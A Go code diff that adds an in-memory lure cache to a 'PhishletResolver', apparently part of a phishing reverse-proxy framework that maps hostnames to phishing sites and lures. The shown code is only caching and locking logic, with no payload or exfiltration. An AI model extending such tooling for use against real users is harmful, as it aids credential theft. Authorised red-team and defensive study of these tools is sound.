@@ -7,13 +7,16 @@ import (
 )
 
 // PhishletResolver maps request hostnames to their phishlet and lure.
-// All phishlet state is held in memory; lures are still queried from the store.
+// All phishlet and lure state is held in memory.
 // Register must be called whenever a phishlet's rules or operator config changes.
+// InvalidateLures must be called whenever a lure is created, updated, or deleted.
 type PhishletResolver struct {
 	mu        sync.RWMutex
 	phishlets map[string]*Phishlet // name → phishlet
 	hostnames map[string]*Phishlet // lowercase hostname → phishlet (enabled only)
 	lureStore LureStore
+	luresMu   sync.RWMutex
+	lures     []*Lure // cached; refreshed by InvalidateLures
 }
 
 func NewPhishletResolver(lureStore LureStore) *PhishletResolver {
@@ -22,6 +25,31 @@ func NewPhishletResolver(lureStore LureStore) *PhishletResolver {
 		hostnames: make(map[string]*Phishlet),
 		lureStore: lureStore,
 	}
+}
+
+// LoadLuresFromDB populates the in-memory lure cache from the store.
+// Call once at startup before serving requests.
+func (r *PhishletResolver) LoadLuresFromDB() error {
+	lures, err := r.lureStore.ListLures()
+	if err != nil {
+		return fmt.Errorf("loading lures: %w", err)
+	}
+	r.luresMu.Lock()
+	r.lures = lures
+	r.luresMu.Unlock()
+	return nil
+}
+
+// InvalidateLures reloads the lure cache from the store. Call after any lure mutation.
+// On store error the stale cache is kept so in-flight requests are not disrupted.
+func (r *PhishletResolver) InvalidateLures() {
+	lures, err := r.lureStore.ListLures()
+	if err != nil {
+		return
+	}
+	r.luresMu.Lock()
+	r.lures = lures
+	r.luresMu.Unlock()
 }
 
 // Register stores p in both indexes. If p is enabled and has a non-empty hostname
@@ -78,10 +106,9 @@ func (r *PhishletResolver) ResolveHostname(hostname, urlPath string) (*Phishlet,
 		return nil, nil, fmt.Errorf("no phishlet configured for %q", hostname)
 	}
 
-	lures, err := r.lureStore.ListLures()
-	if err != nil {
-		return nil, nil, fmt.Errorf("listing lures: %w", err)
-	}
+	r.luresMu.RLock()
+	lures := r.lures
+	r.luresMu.RUnlock()
 
 	var matched *Lure
 	matchLen := -1
